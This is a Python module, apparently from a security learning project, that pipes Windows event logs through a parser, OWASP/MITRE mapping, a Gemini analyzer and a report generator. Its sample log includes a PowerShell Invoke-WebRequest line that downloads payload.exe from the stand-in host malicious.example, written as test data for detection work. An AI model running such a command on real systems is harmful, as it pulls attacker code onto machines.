"""
event_log_report_pipeline.py

Ties together the full pipeline required for Day 16:

    raw event log text
        -> event_log_parser (parse + extract keywords)
        -> framework_mapper (OWASP + MITRE lookup per keyword)
        -> llm_analyzer (analysis summary — Gemini, with rule-based fallback)
        -> report_generator (final formatted report)

Mirrors nmap_report_pipeline.py (Day 15), swapping the input source from
Nmap scan output to security event log entries.
"""

from event_log_parser import parse_event_log, extract_keywords
from framework_mapper import map_keyword
from llm_analyzer import analyze_findings
from report_generator import generate_report


def run_event_log_to_report(log_text, report_format="text", audience="general", use_llm=True):
    """
    Run the full Event Log -> mapping -> analysis -> report pipeline.

    Args:
        log_text (str): Raw event log text (see event_log_parser for the
            expected line format).
        report_format (str): One of "text", "json", or "markdown".
            Defaults to "text".
        audience (str): "general", "student", "enterprise", "red_team",
            "blue_team", or "bug_bounty". Controls the tone/depth of the
            Gemini-generated analysis (ignored by the rule-based fallback).
        use_llm (bool): If True (default), try the real Gemini API first,
            falling back to a deterministic rule-based summary if it's
            unavailable. If False, skip Gemini entirely (fast/offline).

    Returns:
        dict: {
            "entries": list[dict],       # parsed log entries
            "keywords": list[str],       # extracted/inferred indicator keywords
            "findings": list[dict],      # per-keyword OWASP+MITRE mapping
            "analysis": str,             # generated analysis summary
            "report": str,               # final formatted report
        }

    Example:
        >>> log = "2026-08-18 10:16:01 [Security] EventID=4104 Description: PowerShell script block logged"
        >>> result = run_event_log_to_report(log, use_llm=False)
        >>> "powershell" in result["keywords"]
        True
    """
    entries = parse_event_log(log_text)
    keywords = extract_keywords(entries)

    findings = [map_keyword(kw) for kw in keywords]

    analysis = analyze_findings(findings, audience=audience, use_llm=use_llm)

    report = generate_report(findings, analysis, report_format=report_format)

    return {
        "entries": entries,
        "keywords": keywords,
        "findings": findings,
        "analysis": analysis,
        "report": report,
    }


if __name__ == "__main__":
    sample_log = """
2026-08-18 10:15:32 [Security] EventID=4625 Description: An account failed to log on. Failure Reason: Unknown user name or bad password.
2026-08-18 10:15:34 [Security] EventID=4625 Description: An account failed to log on. Failure Reason: Unknown user name or bad password.
2026-08-18 10:15:36 [Security] EventID=4625 Description: An account failed to log on. Failure Reason: Unknown user name or bad password.
2026-08-18 10:16:01 [Security] EventID=4104 Description: PowerShell script block logged - Invoke-WebRequest -Uri http://malicious.example -OutFile payload.exe
2026-08-18 10:17:45 [System]   EventID=7045 Description: A new service was installed on the system.
"""
    result = run_event_log_to_report(sample_log, report_format="text")
    print(result["report"])